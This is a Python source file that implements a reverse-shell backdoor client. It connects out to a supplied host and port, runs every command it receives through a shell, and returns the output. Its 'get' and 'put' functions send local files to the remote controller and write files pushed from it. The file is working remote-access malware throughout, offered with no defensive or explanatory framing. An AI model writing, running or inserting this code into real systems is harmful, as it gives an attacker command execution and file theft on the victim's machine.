import socket
import subprocess
import os

def get(sock,cmd):
    if os.path.exists((cmd.split(b' ')[1]).decode('utf-8')):
        with open((cmd.split(b' ')[1]).decode('utf-8'),'rb') as file:
            packet=file.read(1024)
            while packet!=b'':
                sock.sendall(packet)
                packet=file.read(1024)
            sock.sendall(b'DONE')         
    else:
        sock.sendall(b'Unable to find out the file')

def put(sock,cmd):
    bits=sock.recv(1024)
    with open((cmd.split(b' ')[1].decode("utf-8")),'wb') as file:       
        while True:
            if bits.endswith(b"DONE"):
                file.close()
                break
            file.write(bits)
            bits=sock.recv(1024)

def start(host,port):
    try:
        with socket.socket(socket.AF_INET,socket.SOCK_STREAM) as sock:
            sock.connect((host,port))
            while True:
                cmd=sock.recv(10240)
                if b'exit' in cmd:
                    break
                elif b'get' in cmd:
                    get(sock,cmd)
                elif b'put' in cmd:
                    put(sock,cmd)
                else:
                    cmdOutput=subprocess.Popen(cmd,shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE,stdin=subprocess.PIPE)
                    sock.sendall(cmdOutput.stdout.read())
                    sock.sendall(cmdOutput.stderr.read())
    except ConnectionRefusedError as e:
        print(f'[-] Error: {e}')
